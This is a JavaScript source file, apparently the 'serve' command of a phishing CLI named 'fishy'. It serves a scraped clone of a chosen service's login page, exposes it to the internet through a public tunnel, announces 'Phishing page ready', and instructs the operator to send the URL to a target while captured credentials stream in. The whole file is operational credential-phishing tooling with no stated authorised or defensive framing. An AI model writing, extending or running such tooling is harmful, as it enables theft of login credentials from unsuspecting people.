import { createServer } from '../lib/server.js';
import { getScrapedPage, getService } from '../lib/service-registry.js';
import { startTunnel, stopTunnel } from '../lib/tunnel.js';
import { pickService, pickTunnelType } from '../lib/tui.js';
import { printBanner, printSection, printSpin } from '../lib/ui.js';
import chalk from 'chalk';

export async function serveCommand(serviceArg, options) {
  printBanner();

  let service;
  if (serviceArg) {
    service = { id: serviceArg, name: getService(serviceArg)?.name || serviceArg };
  } else {
    service = await pickService();
  }

  const html = getScrapedPage(service.id, 'login');
  if (!html && !service.custom) {
    console.log(chalk.yellow(`\n  ⚠  "${service.name}" hasn't been scraped yet.`));
    console.log(chalk.gray(`  Run: fishy scrape ${service.id}\n`));
    return;
  }

  printSection(`Starting server for ${chalk.cyan(service.name)}`);

  const spin = printSpin('Starting server...');
  let serverInfo;
  try {
    serverInfo = await createServer(service.id, options.port || 0);
    spin.stop(`Server running at ${chalk.cyan(serverInfo.url)}`);
  } catch (err) {
    spin.fail(`Failed to start server: ${err.message}`);
    return;
  }

  let tunnelProc = null;
  let tunnelUrl = null;
  if (options.tunnel) {
    const tunnelType = typeof options.tunnel === 'string' ? options.tunnel : await pickTunnelType();
    const tunnelSpin = printSpin(`Starting ${tunnelType} tunnel...`);
    try {
      const result = await startTunnel(tunnelType, serverInfo.port);
      if (result && result.url) {
        tunnelUrl = result.url;
        tunnelProc = result.proc;
        tunnelSpin.stop(`Tunnel active at ${chalk.green(tunnelUrl)}`);
      } else {
        tunnelSpin.fail(`Could not get tunnel URL. Is ${tunnelType} installed?`);
      }
    } catch (err) {
      tunnelSpin.fail(`Tunnel failed: ${err.message}`);
    }
  }

  console.log();
  console.log(chalk.gray('  ─────────────────────────────────────────────'));
  console.log(chalk.white('  🎣  Phishing page ready'));
  console.log(chalk.gray('  ─────────────────────────────────────────────'));
  console.log(`  ${chalk.white('Service:')}   ${chalk.cyan(service.name)}`);
  console.log(`  ${chalk.white('Local URL:')}  ${chalk.cyan(serverInfo.url)}`);
  if (tunnelUrl) {
    console.log(`  ${chalk.white('Public URL:')} ${chalk.green(tunnelUrl)}`);
  } else if (options.tunnel) {
    console.log(`  ${chalk.white('Tunnel:')}    ${chalk.red('failed')}`);
  }
  console.log(`  ${chalk.white('Captures:')}  ${chalk.yellow('0')} (watching...)`);
  console.log(chalk.gray('  ─────────────────────────────────────────────'));
  console.log(chalk.gray('  Send the URL to your target.'));
  console.log(chalk.gray('  Captures will appear here in real-time.'));
  console.log();

  if (options.open !== false) {
    const open = (await import('open')).default;
    open(serverInfo.url).catch(() => {});
  }

  // Cleanup on exit
  const cleanup = () => {
    if (tunnelProc) stopTunnel(tunnelProc);
    serverInfo.server.close();
  };
  process.on('SIGINT', () => { cleanup(); process.exit(0); });
  process.on('SIGTERM', () => { cleanup(); process.exit(0); });

  // Keep alive
  await new Promise(() => {});
}
